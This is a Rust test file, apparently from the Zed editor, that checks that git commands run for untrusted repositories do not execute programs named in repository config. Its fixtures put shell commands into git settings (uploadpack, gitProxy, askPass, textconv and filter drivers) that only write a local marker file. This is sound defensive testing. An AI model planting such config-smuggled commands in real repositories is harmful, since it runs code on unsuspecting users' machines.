    /// Any command reading an object a partial clone lacks fetches it from the promisor remote,
    /// which runs the repository's `remote.<name>.uploadpack` for a local one.
    #[gpui::test]
    async fn test_untrusted_partial_clone_fetches_nothing_lazily(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let source_dir = temp_dir.path().join("source");
        git_init_repo(&source_dir);
        fs::write(source_dir.join("f.txt"), "hello\n").unwrap();
        git_command(&source_dir, ["add", "f.txt"]);
        git_command(&source_dir, ["commit", "-m", "source"]);
        git_command(&source_dir, ["config", "uploadpack.allowFilter", "true"]);
        git_command(
            &source_dir,
            ["config", "uploadpack.allowAnySHA1InWant", "true"],
        );
        let source_path = forward_slashes(&source_dir);
        let source_url = if source_path.starts_with('/') {
            format!("file://{source_path}")
        } else {
            format!("file:///{source_path}")
        };
        let marker = temp_dir.path().join("program-ran");
        let clone = |name: &str| {
            git_command(
                temp_dir.path(),
                [
                    "clone",
                    "--quiet",
                    "--filter=blob:none",
                    "--no-checkout",
                    &source_url,
                    name,
                ],
            );
            let clone_dir = temp_dir.path().join(name);
            git_command(
                &clone_dir,
                [
                    "config",
                    "remote.origin.uploadpack",
                    &format!(
                        "echo uploadpack >> \"{}\"; git-upload-pack",
                        forward_slashes(&marker)
                    ),
                ],
            );
            clone_dir
        };

        let unguarded_dir = clone("unguarded");
        assert_eq!(
            git_command_output(&unguarded_dir, ["cat-file", "-p", "HEAD:f.txt"]),
            "hello"
        );
        assert!(marker.exists(), "the installed git fetches lazily");
        fs::remove_file(&marker).unwrap();

        let repo_dir = clone("repo");
        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [
            vec!["cat-file", "-p", "HEAD:f.txt"],
            vec!["log", "-p", "-1"],
            vec!["checkout", "main", "--", "f.txt"],
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            if marker.exists() && !installed_git_supports_no_lazy_fetch() {
                log::warn!("the installed git cannot turn lazy fetches off");
                return;
            }
            assert!(
                !marker.exists(),
                "{args:?} fetched lazily: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    /// A partial clone that names no `uploadpack` of its own keeps fetching what it lacks, also for
    /// the commands that do not otherwise read the configuration, such as the `cat-file` of a
    /// commit's older contents, and also from a linked worktree.
    #[gpui::test]
    async fn test_untrusted_partial_clone_without_remote_programs_fetches_lazily(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let source_dir = temp_dir.path().join("source");
        git_init_repo(&source_dir);
        fs::write(source_dir.join("f.txt"), "first\n").unwrap();
        git_command(&source_dir, ["add", "f.txt"]);
        git_command(&source_dir, ["commit", "-m", "first"]);
        for contents in ["second", "third"] {
            fs::write(source_dir.join("f.txt"), format!("{contents}\n")).unwrap();
            git_command(&source_dir, ["commit", "-am", contents]);
        }
        git_command(&source_dir, ["config", "uploadpack.allowFilter", "true"]);
        git_command(
            &source_dir,
            ["config", "uploadpack.allowAnySHA1InWant", "true"],
        );
        let source_path = forward_slashes(&source_dir);
        let source_url = if source_path.starts_with('/') {
            format!("file://{source_path}")
        } else {
            format!("file:///{source_path}")
        };
        git_command(
            temp_dir.path(),
            [
                "clone",
                "--quiet",
                "--filter=blob:none",
                &source_url,
                "repo",
            ],
        );
        let repo_dir = temp_dir.path().join("repo");
        let worktree_dir = temp_dir.path().join("linked");
        git_command(
            &repo_dir,
            [
                OsString::from("worktree"),
                OsString::from("add"),
                OsString::from("--detach"),
                worktree_dir.as_os_str().into(),
            ],
        );

        // Each reads a blob that only the promisor remote has.
        for (working_directory, git_directory, revision, contents) in [
            (
                repo_dir.clone(),
                repo_dir.join(".git"),
                "HEAD~1:f.txt",
                "second\n",
            ),
            (
                worktree_dir.clone(),
                repo_dir.join(".git").join("worktrees").join("linked"),
                "HEAD~2:f.txt",
                "first\n",
            ),
        ] {
            let git = GitBinary::new(
                PathBuf::from("git"),
                working_directory,
                git_directory,
                cx.executor(),
                false,
            );
            let output = git
                .build_command(&["cat-file", "-p", revision])
                .await
                .output()
                .await
                .unwrap();
            assert!(
                output.status.success(),
                "{revision} from {:?}: {}",
                git.git_directory,
                String::from_utf8_lossy(&output.stderr)
            );
            assert_eq!(String::from_utf8_lossy(&output.stdout), contents);
        }
    }

    /// `GIT_NO_LAZY_FETCH` came with git 2.45.1 (and the security releases of that day).
    fn installed_git_supports_no_lazy_fetch() -> bool {
        installed_git_version() >= GitVersion::new(2, 45, 1)
    }

    /// `core.gitProxy` (for `git://`) and `core.askPass` (for credentials) name programs git runs
    /// directly. `-c` cannot replace the first, of which git takes the first matching value.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_proxy_or_askpass_program(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let marker = temp_dir.path().join("program-ran");
        let program = temp_dir.path().join("program.sh");
        write_marker_program(&program, &marker);
        let program_path = forward_slashes(&program);
        git_command(&repo_dir, ["config", "core.gitProxy", &program_path]);
        git_command(&repo_dir, ["config", "core.askPass", &program_path]);
        git_command(
            &repo_dir,
            ["remote", "add", "proxied", "git://127.0.0.1:9/repository"],
        );
        let credential_request = "protocol=https\nhost=example.invalid\n\n";

        unguarded_git_output(&repo_dir, &["ls-remote", "proxied"], "");
        assert!(marker.exists(), "the installed git runs core.gitProxy");
        fs::remove_file(&marker).unwrap();
        unguarded_git_output(&repo_dir, &["credential", "fill"], credential_request);
        assert!(marker.exists(), "the installed git runs core.askPass");
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["ls-remote", "proxied"])
            .await
            .output()
            .await
            .unwrap();
        assert!(
            !marker.exists(),
            "core.gitProxy ran: {}",
            String::from_utf8_lossy(&output.stderr)
        );

        let mut child = git
            .build_command(&["credential", "fill"])
            .await
            .env("GIT_TERMINAL_PROMPT", "0")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        let mut child_stdin = child.stdin.take().unwrap();
        child_stdin
            .write_all(credential_request.as_bytes())
            .await
            .unwrap();
        drop(child_stdin);
        let output = child.output().await.unwrap();
        assert!(
            !marker.exists(),
            "core.askPass ran: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// The empty `GIT_ASKPASS` of an untrusted repository's commands gives way to Zed's own for the
    /// push, pull and fetch that `run_git_command` runs, and to one from the caller's environment;
    /// a trusted repository's commands get neither empty variable nor `diff.submodule=short`.
    #[gpui::test]
    async fn test_untrusted_environment_keeps_zeds_askpass(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();
        if ["GIT_ASKPASS", "GIT_PROXY_COMMAND"]
            .iter()
            .any(|variable| std::env::var_os(variable).is_some())
        {
            log::warn!("the test's own environment sets GIT_ASKPASS or GIT_PROXY_COMMAND");
            return;
        }

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        git_command(
            &repo_dir,
            [
                "config",
                "alias.envprobe",
                "!echo \"[${GIT_ASKPASS-unset}][${GIT_PROXY_COMMAND-unset}]\"",
            ],
        );
        let git_binary = |is_trusted| {
            GitBinary::new(
                PathBuf::from("git"),
                repo_dir.clone(),
                repo_dir.join(".git"),
                cx.executor(),
                is_trusted,
            )
        };
        let probe = async |git: &GitBinary, env: HashMap<String, String>| {
            let env = Arc::new(env);
            let mut command = git.build_command(&["envprobe"]).await;
            command
                .envs(env.iter())
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());
            run_git_command(
                env,
                AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
                command,
                cx.executor(),
            )
            .await
            .unwrap()
            .stdout
            .trim()
            .to_string()
        };
        let direct_output = async |git: &GitBinary, args: &[&str]| {
            let output = git.build_command(args).await.output().await.unwrap();
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        };

        let untrusted = git_binary(false);
        assert_eq!(direct_output(&untrusted, &["envprobe"]).await, "[][]");
        let through_askpass = probe(&untrusted, HashMap::default()).await;
        assert!(
            through_askpass.ends_with("][]")
                && !through_askpass.starts_with("[]")
                && !through_askpass.starts_with("[unset]"),
            "Zed's askpass must replace the empty GIT_ASKPASS: {through_askpass}"
        );
        assert_eq!(
            probe(
                &untrusted,
                HashMap::from_iter([("GIT_ASKPASS".to_string(), "callers-askpass".to_string())])
            )
            .await,
            "[callers-askpass][]"
        );
        assert_eq!(
            direct_output(&untrusted, &["config", "--get", "diff.submodule"]).await,
            "short"
        );

        let trusted = git_binary(true);
        assert_eq!(
            direct_output(&trusted, &["envprobe"]).await,
            "[unset][unset]"
        );
        assert_eq!(
            direct_output(&trusted, &["config", "--get", "diff.submodule"]).await,
            ""
        );
    }

    /// `diff.submodule=diff` shows a submodule's changes by running `git diff` inside it, which
    /// the superproject's `--no-textconv` does not reach, so the submodule's textconv would run.
    #[gpui::test]
    async fn test_untrusted_repository_runs_no_submodule_textconv_programs(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let submodule_dir = repo_dir.join("sub");
        git_init_repo(&repo_dir);
        git_init_repo(&submodule_dir);
        fs::write(submodule_dir.join("f.txt"), "one\n").unwrap();
        git_command(&submodule_dir, ["add", "f.txt"]);
        git_command(&submodule_dir, ["commit", "-m", "one"]);
        fs::write(
            repo_dir.join(".gitmodules"),
            "[submodule \"sub\"]\n\tpath = sub\n\turl = ./sub\n",
        )
        .unwrap();
        git_command(&repo_dir, ["add", ".gitmodules", "sub"]);
        git_command(&repo_dir, ["commit", "-m", "add"]);
        let marker = temp_dir.path().join("program-ran");
        git_command(
            &submodule_dir,
            [
                "config",
                "diff.evil.textconv",
                &format!("echo textconv >> \"{}\"; cat", forward_slashes(&marker)),
            ],
        );
        fs::write(
            submodule_dir.join(".git/info/attributes"),
            "*.txt diff=evil\n",
        )
        .unwrap();
        fs::write(submodule_dir.join("f.txt"), "two\n").unwrap();
        git_command(&submodule_dir, ["commit", "-am", "two"]);
        git_command(&repo_dir, ["config", "diff.submodule", "diff"]);
        git_command(&repo_dir, ["commit", "-am", "bump"]);

        git_command(&repo_dir, ["show", "HEAD"]);
        assert!(
            marker.exists(),
            "the installed git runs the submodule's textconv"
        );
        fs::remove_file(&marker).unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        );
        for args in [
            vec!["show", "HEAD"],
            vec!["log", "-p", "-1"],
            vec!["diff", "HEAD~1", "HEAD"],
        ] {
            let output = git.build_command(&args).await.output().await.unwrap();
            assert!(
                output.status.success(),
                "{args:?}: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            assert!(!marker.exists(), "{args:?} ran the submodule's textconv");
            assert!(
                String::from_utf8_lossy(&output.stdout).contains("+Subproject commit"),
                "{args:?} shows the submodule as a commit: {}",
                String::from_utf8_lossy(&output.stdout)
            );
        }
    }

    /// A `GIT_DIR` in the environment of Zed's git commands points at the superproject; reading a
    /// submodule's configuration must not follow it, or the submodule's filters go unnoticed.
    #[gpui::test]
    async fn test_untrusted_repository_reads_submodule_config_despite_git_dir(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let submodule_dir = repo_dir.join("sub");
        git_init_repo(&repo_dir);
        git_init_repo(&submodule_dir);
        fs::write(submodule_dir.join("f.txt"), "one\n").unwrap();
        git_command(&submodule_dir, ["add", "f.txt"]);
        git_command(&submodule_dir, ["commit", "-m", "inner"]);
        git_command(&repo_dir, ["add", "sub"]);
        git_command(&repo_dir, ["commit", "-m", "outer"]);
        let marker = temp_dir.path().join("program-ran");
        git_command(
            &submodule_dir,
            [
                "config",
                "filter.evil.clean",
                &format!("sh -c 'echo evil >> \"{}\"; cat'", forward_slashes(&marker)),
            ],
        );
        git_command(&submodule_dir, ["config", "filter.evil.required", "true"]);
        fs::write(
            submodule_dir.join(".git/info/attributes"),
            "*.txt filter=evil\n",
        )
        .unwrap();
        // Same size, so git inside reads the file to tell whether it changed.
        fs::write(submodule_dir.join("f.txt"), "two\n").unwrap();

        let git = GitBinary::new(
            PathBuf::from("git"),
            repo_dir.clone(),
            repo_dir.join(".git"),
            cx.executor(),
            false,
        )
        .envs(HashMap::from_iter([(
            "GIT_DIR".to_string(),
            repo_dir.join(".git").to_string_lossy().into_owned(),
        )]));
        let output = git
            .build_command(&["describe", "--dirty", "--always"])
            .await
            .output()
            .await
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            String::from_utf8_lossy(&output.stdout).contains("-dirty"),
            "git looked inside the submodule: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        assert!(
            !marker.exists(),
            "the submodule's filter ran: {:?}",
            fs::read_to_string(&marker)
        );
    }

    #[test]
    fn test_untrusted_signing_overrides_from_config_output() {
        let output = b"global\0gpg.program\nmy-gpg\0\
            local\0gpg.program\nevil\0\
            local\0gpg.ssh.defaultkeycommand\nevil-key\0\
            worktree\0gpg.format\nssh\0\
            local\0gpg.mintrustlevel\nfully\0\
            global\0commit.gpgsign\ntrue\0\
            local\0filter.evil.clean\nx\0";
        let overrides = untrusted_config_overrides(output, true).unwrap();
        assert_eq!(
            overrides,
            UntrustedConfigOverrides {
                filter_drivers: BTreeSet::from(["evil".to_string()]),
                merge_drivers: BTreeMap::new(),
                remote_programs: BTreeSet::new(),
                signing_settings: BTreeMap::from_iter([
                    ("gpg.format".to_string(), "openpgp".to_string()),
                    ("gpg.program".to_string(), "my-gpg".to_string()),
                    ("gpg.ssh.defaultkeycommand".to_string(), String::new()),
                ]),
                signing_disabled: true,
                signing_requested: true,
            }
        );
        assert!(overrides.signing_is_skipped());
        assert_eq!(
            overrides.args(),
            [
                "-c",
                "filter.evil.clean=",
                "-c",
                "filter.evil.smudge=",
                "-c",
                "filter.evil.process=",
                "-c",
                "filter.evil.required=false",
                "-c",
                "gpg.format=openpgp",
                "-c",
                "gpg.program=my-gpg",
                "-c",
                "gpg.ssh.defaultkeycommand=",
                "-c",
                "commit.gpgSign=false",
                "-c",
                "tag.gpgSign=false",
                "-c",
                "push.gpgSign=false",
            ]
        );

        let users_only = untrusted_config_overrides(
            b"global\0gpg.program\nmy-gpg\0local\0gpg.program\nevil\0local\0commit.gpgsign\0",
            true,
        )
        .unwrap();
        assert!(
            !users_only.signing_disabled,
            "the user's program replaces it"
        );
        assert!(
            users_only.signing_requested,
            "a key without a value is true"
        );
        assert!(!users_only.signing_is_skipped());
        assert!(
            untrusted_config_overrides(b"global\0gpg.program\nmy-gpg\0", true)
                .unwrap()
                .args()
                .is_empty(),
            "the user's own settings are left alone"
        );
        assert_eq!(
            untrusted_config_overrides(b"gpg.program\nmy-gpg\0", false)
                .unwrap()
                .signing_settings,
            BTreeMap::from_iter([("gpg.program".to_string(), "gpg".to_string())]),
            "without scopes every signing setting counts as the repository's"
        );
        assert!(
            !untrusted_config_overrides(b"local\0commit.gpgsign\nfalse\0", true)
                .unwrap()
                .signing_requested
        );
    }

    #[test]
    fn test_command_may_run_signature_programs() {
        for args in [
            vec!["log", GRAPH_COMMIT_FORMAT, "--date-order"],
            vec!["log", LEGACY_GRAPH_COMMIT_FORMAT],
            vec!["log", SEARCH_COMMIT_FORMAT, "-G", "x"],
            vec!["show", "--no-patch", "--format=%H%x00%B", "HEAD"],
            vec!["show", "--format=", "-z", "--raw"],
            vec!["log", "--oneline"],
            vec!["log", "--pretty=format:%s"],
            vec!["log", "--format=fuller"],
            vec!["rev-parse", "HEAD"],
            vec!["for-each-ref", "--format=%(refname)"],
            vec!["branch", "--list"],
            vec!["config", "--get", "user.name"],
        ] {
            assert!(!command_may_run_signature_programs(&args), "{args:?}");
        }
        for args in [
            vec!["log"],
            vec!["log", "-1", "--format=%G?"],
            vec!["log", "--pretty=sig"],
            vec!["log", "--format=one"],
            vec!["log", "--oneline", "--show-signature"],
            vec!["show", "HEAD"],
            vec!["diff-tree", "--root", "-r", "HEAD"],
            vec!["for-each-ref", "--format=%(signature:key)"],
            vec!["branch", "--format=%(signature)"],
            vec!["commit", "-m", "x"],
            vec!["tag", "-a", "v1"],
            vec!["merge", "--verify-signatures", "x"],
            vec!["verify-commit", "HEAD"],
            vec!["push"],
            vec!["commit-tree", "HEAD^{tree}"],
            vec!["-C", "elsewhere", "rev-parse"],
        ] {
            assert!(command_may_run_signature_programs(&args), "{args:?}");
        }
        assert!(!command_may_run_signature_programs::<&str>(&[]));

        for args in [
            vec!["add", "-A"],
            vec!["stash", "push"],
            vec!["describe", "--dirty"],
            vec!["commit", "-a"],
            vec!["diff-index", "HEAD"],
            vec!["-C", "elsewhere", "status"],
            vec!["reset", "--hard", "HEAD"],
            vec!["reset", "--quiet", "--"],
            vec!["ls-files", "--recurse-submodules", "-m"],
            vec!["status", "--recurse-submodules=yes"],
            vec!["push", "--recurse-submodules=on-demand"],
            vec!["push"],
            vec!["fetch", "--recurse-submodules"],
            vec!["fetch", "origin"],
            vec!["pull"],
        ] {
            assert!(command_may_look_inside_submodules(&args), "{args:?}");
        }
        for args in [
            vec!["status", "--porcelain"],
            vec!["diff"],
            vec!["ls-files", "-m"],
            vec!["update-index", "--add", "--remove", "--"],
            vec!["ls-remote", "origin"],
            vec!["log", "-1"],
            vec!["hash-object", "--stdin"],
        ] {
            assert!(!command_may_look_inside_submodules(&args), "{args:?}");
        }
    }

    #[test]
    fn test_untrusted_merge_drivers_and_remote_programs_from_config_output() {
        let output = b"global\0merge.mine.driver\nmy-merge %O %A %B\0\
            local\0merge.mine.driver\nevil\0\
            local\0merge.evil.driver\nevil\0\
            worktree\0merge.a.b.driver\nevil\0\
            global\0merge.untouched.driver\nmine\0\
            system\0remote.origin.uploadpack\nmine\0\
            local\0remote.x.y.uploadpack\nevil\0\
            command\0remote.origin.receivepack\nevil\0";
        let overrides = untrusted_config_overrides(output, true).unwrap();
        assert_eq!(
            overrides.merge_drivers,
            BTreeMap::from_iter([
                ("merge.a.b.driver".to_string(), "false".to_string()),
                ("merge.evil.driver".to_string(), "false".to_string()),
                (
                    "merge.mine.driver".to_string(),
                    "my-merge %O %A %B".to_string()
                ),
            ]),
            "the repository's drivers fail, or are the user's own of the same name"
        );
        assert_eq!(
            overrides.remote_programs,
            BTreeSet::from([
                "remote.origin.receivepack".to_string(),
                "remote.x.y.uploadpack".to_string(),
            ])
        );
        assert_eq!(
            overrides.args(),
            [
                "-c",
                "merge.a.b.driver=false",
                "-c",
                "merge.evil.driver=false",
                "-c",
                "merge.mine.driver=my-merge %O %A %B",
            ]
        );
        assert!(
            untrusted_config_overrides(
                b"global\0merge.mine.driver\nmine\0system\0remote.o.uploadpack\nx\0",
                true
            )
            .unwrap()
                == UntrustedConfigOverrides::default(),
            "the user's own settings are left alone"
        );
        assert_eq!(
            untrusted_config_overrides(
                b"merge.mine.driver\nmine\0remote.o.receivepack\nx\0",
                false
            )
            .unwrap(),
            UntrustedConfigOverrides {
                merge_drivers: BTreeMap::from_iter([(
                    "merge.mine.driver".to_string(),
                    "false".to_string()
                )]),
                remote_programs: BTreeSet::from(["remote.o.receivepack".to_string()]),
                ..UntrustedConfigOverrides::default()
            },
            "without scopes every setting counts as the repository's"
        );
        assert!(untrusted_config_overrides(b"local\0merge.x=y.driver\nx\0", true).is_err());
        assert!(untrusted_config_overrides(b"local\0merge.\xff.driver\nx\0", true).is_err());

        let mut superproject =
            untrusted_config_overrides(b"local\0merge.evil.driver\nx\0", true).unwrap();
        superproject.add_submodule(
            untrusted_config_overrides(
                b"local\0merge.deep.driver\nx\0local\0remote.origin.uploadpack\nx\0",
                true,
            )
            .unwrap(),
        );
        assert_eq!(
            superproject.merge_drivers.keys().collect::<Vec<_>>(),
            ["merge.deep.driver", "merge.evil.driver"]
        );
        assert_eq!(superproject.remote_programs.len(), 1);
    }

    #[test]
    fn test_command_may_contact_remotes() {
        for args in [
            vec!["fetch", "origin"],
            vec!["pull"],
            vec!["push"],
            vec!["ls-remote", "origin"],
            vec!["submodule", "update"],
            vec!["remote", "update"],
            vec!["remote", "-v", "show", "origin"],
            vec!["remote", "prune", "origin"],
        ] {
            assert!(command_may_contact_remotes(&args), "{args:?}");
        }
        for args in [
            vec!["remote", "-v"],
            vec!["remote"],
            vec!["remote", "add", "origin", "../x"],
            vec!["remote", "remove", "origin"],
            vec!["log"],
            vec!["merge", "origin/main"],
        ] {
            assert!(!command_may_contact_remotes(&args), "{args:?}");
        }
        assert!(!command_may_contact_remotes::<&str>(&[]));
    }

    #[test]
    fn test_untrusted_filter_drivers_from_config_output() {
        let with_scope = b"system\0filter.lfs.clean\ngit-lfs clean -- %f\0\
            global\0filter.mine.smudge\nmine\0\
            local\0filter.evil.clean\nsh -c 'x\ny'\0\
            worktree\0filter.a.b.process\nz\0\
            command\0filter.evil.required\0";
        assert_eq!(
            untrusted_config_overrides(with_scope, true)
                .map(|overrides| overrides.filter_drivers)
                .unwrap()
                .into_iter()
                .collect::<Vec<_>>(),
            ["a.b", "evil"],
            "the user's own drivers stay; the repository's (with dots, valueless) go"
        );
        let without_scope = b"filter.lfs.clean\ngit-lfs clean -- %f\0filter.evil.clean\nx\0";
        assert_eq!(
            untrusted_config_overrides(without_scope, false)
                .map(|overrides| overrides.filter_drivers)
                .unwrap()
                .into_iter()
                .collect::<Vec<_>>(),
            ["evil", "lfs"],
            "without scopes every driver goes"
        );
        assert!(
            untrusted_config_overrides(b"local\0filter.x=y.clean\nx\0", true)
                .map(|overrides| overrides.filter_drivers)
                .is_err()
        );
        assert!(
            untrusted_config_overrides(b"local\0filter.\xff.clean\nx\0", true)
                .map(|overrides| overrides.filter_drivers)
                .is_err()
        );
        assert!(
            untrusted_config_overrides(b"", true)
                .map(|overrides| overrides.filter_drivers)
                .unwrap()
                .is_empty()
        );

        assert_eq!(
            filter_driver_overrides(&BTreeSet::from(["evil".to_string()])),
            [
                "-c",
                "filter.evil.clean=",
                "-c",
                "filter.evil.smudge=",
                "-c",
                "filter.evil.process=",
                "-c",
                "filter.evil.required=false",
            ]
        );
        let oid = "a".repeat(40);
        for args in [
            vec!["status"],
            vec!["hash-object"],
            vec!["checkout"],
            vec!["add"],
            vec!["diff"],
            vec!["stash"],
            vec!["apply"],
            vec!["rebase"],
            vec!["cherry-pick"],
            vec!["merge"],
            vec!["ls-files", "-m"],
            vec!["ls-files", "--others"],
            vec!["describe", "--dirty"],
            vec!["cat-file", "--filters", "HEAD:f.txt"],
            vec!["cat-file", "--fil", "HEAD:f.txt"],
            vec!["cat-file", "--batch", "--textconv"],
            vec!["cat-file", "--path=f.txt", "blob", &oid],
            vec!["-C", "elsewhere", "log"],
        ] {
            assert!(command_may_run_filters(&args), "{args:?}");
        }
        for args in [
            vec!["log", "-p"],
            vec!["for-each-ref"],
            vec!["rev-parse", "HEAD"],
            vec!["config", "--get", "user.name"],
            vec!["cat-file", "blob", &oid],
            vec!["cat-file", "--batch=%(objectsize)"],
            vec!["cat-file", "--batch-check=%(objectname) %(objecttype)"],
            vec!["cat-file", "-t", &oid],
        ] {
            assert!(!command_may_run_filters(&args), "{args:?}");
        }
        assert!(!command_may_run_filters::<&str>(&[]));
    }

    /// The plumbing `Repository::reword_commit` drives: an older commit is rebuilt with
    /// `commit-tree` and the branch is moved onto it, keeping the original author.
    #[gpui::test]
    async fn test_run_command_rewrites_an_older_commit_keeping_its_author(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");

        fs::write(&file_path, "one\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "first"]);

        fs::write(&file_path, "two\n").unwrap();
        git_command(
            repo_dir.path(),
            [
                "commit",
                "-am",
                "second",
                "--author=Other Person <other@example.com>",
            ],
        );
        let second = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);

        fs::write(&file_path, "three\n").unwrap();
        git_command(repo_dir.path(), ["commit", "-am", "third"]);

        let repository = open_repository(repo_dir.path(), cx);
        let env = Arc::new(test_commit_envs());

        let author = repository
            .run_command(
                vec![
                    "log".into(),
                    "-1".into(),
                    "--format=%an%x00%ae%x00%ad".into(),
                    "--date=raw".into(),
                    second.clone(),
                ],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(author.succeeded(), "{}", author.failure_message());
        let fields: Vec<&str> = author.stdout.trim_end().split('\0').collect();
        assert_eq!(
            fields.len(),
            3,
            "unexpected author line: {:?}",
            author.stdout
        );
        let author_env = HashMap::from_iter([
            ("GIT_AUTHOR_NAME".to_string(), fields[0].to_string()),
            ("GIT_AUTHOR_EMAIL".to_string(), fields[1].to_string()),
            ("GIT_AUTHOR_DATE".to_string(), fields[2].to_string()),
        ]);

        let rebuilt = repository
            .run_command(
                vec![
                    "commit-tree".into(),
                    format!("{second}^{{tree}}"),
                    "-p".into(),
                    format!("{second}^"),
                    "-m".into(),
                    "second (reworded)".into(),
                ],
                None,
                env.clone(),
                author_env,
            )
            .await
            .unwrap();
        assert!(rebuilt.succeeded(), "{}", rebuilt.failure_message());
        let rebuilt_sha = rebuilt.stdout.trim().to_string();

        let rebased = repository
            .run_command(
                vec![
                    "rebase".into(),
                    "--autostash".into(),
                    "--onto".into(),
                    rebuilt_sha,
                    second,
                    "main".into(),
                ],
                None,
                env,
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(rebased.succeeded(), "{}", rebased.failure_message());

        assert_eq!(
            git_command_output(repo_dir.path(), ["log", "--format=%s", "--reverse"]),
            "first\nsecond (reworded)\nthird"
        );
        assert_eq!(
            git_command_output(repo_dir.path(), ["log", "--format=%ae", "--reverse"]),
            "test@zed.dev\nother@example.com\ntest@zed.dev",
            "the rewritten commit has to keep its original author"
        );
    }

    /// [`TAG_LIST_FORMAT`] and `describe --tags --long` are read back by hand, so a real git has
    /// to be the one producing the text the parsers are given.
    #[gpui::test]
    async fn test_tag_listing_and_describe_against_real_git(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");

        fs::write(&file_path, "one\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "first"]);
        git_command(repo_dir.path(), ["tag", "v1.0.0"]);
        let tagged = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);

        fs::write(&file_path, "two\n").unwrap();
        git_command(repo_dir.path(), ["commit", "-am", "second"]);
        git_command(
            repo_dir.path(),
            ["tag", "-a", "v2.0.0", "-m", "リリース 2.0"],
        );
        let annotated_target = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);

        fs::write(&file_path, "three\n").unwrap();
        git_command(repo_dir.path(), ["commit", "-am", "third"]);

        let repository = open_repository(repo_dir.path(), cx);
        let env = Arc::new(test_commit_envs());

        let listed = repository
            .run_command(
                vec![
                    "for-each-ref".into(),
                    "--sort=-creatordate".into(),
                    format!("--format={TAG_LIST_FORMAT}"),
                    "refs/tags/".into(),
                ],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(listed.succeeded(), "{}", listed.failure_message());
        let tags = TagInfo::parse_list(&listed.stdout);
        let tag_named = |name: &str| -> TagInfo {
            tags.iter()
                .find(|tag| tag.name == name)
                .unwrap_or_else(|| panic!("{name} is missing from {:?}", listed.stdout))
                .clone()
        };
        // The order is git's (`--sort=-creatordate`), and two tags made in the same second can
        // come back either way round, so this checks the fields rather than the sequence.
        let annotated = tag_named("v2.0.0");
        assert_eq!(
            annotated,
            TagInfo {
                name: "v2.0.0".into(),
                // The peeled commit, not the tag object.
                commit_sha: annotated_target,
                created_at_unix: annotated.created_at_unix,
                subject: Some("リリース 2.0".into()),
                commit_subject: None,
                annotated: true,
            }
        );
        assert!(
            annotated.created_at_unix.is_some_and(|seconds| seconds > 0),
            "`%(creatordate:raw)` has to yield a timestamp: {:?}",
            listed.stdout
        );
        let lightweight = tag_named("v1.0.0");
        assert_eq!(
            lightweight,
            TagInfo {
                name: "v1.0.0".into(),
                commit_sha: tagged.clone(),
                created_at_unix: lightweight.created_at_unix,
                // `%(contents:subject)` is the tagged commit's subject for a lightweight tag,
                // which is not a tag message and must not be shown as one.
                subject: None,
                commit_subject: Some("first".into()),
                annotated: false,
            }
        );

        let described = repository
            .run_command(
                vec![
                    "describe".into(),
                    "--tags".into(),
                    "--long".into(),
                    "HEAD".into(),
                ],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(described.succeeded(), "{}", described.failure_message());
        let distance =
            TagDistance::parse(described.stdout.trim()).expect("describe output must parse");
        assert_eq!(distance.tag, "v2.0.0");
        assert_eq!(distance.commits_since, 1);
        assert!(!distance.short_sha.is_empty());

        // A branch named like a tag: `%(refname:short)` used to answer `tags/v1.0.0` for the tag
        // then, and `TagInfo::rev` has to keep pointing at the tag rather than the branch.
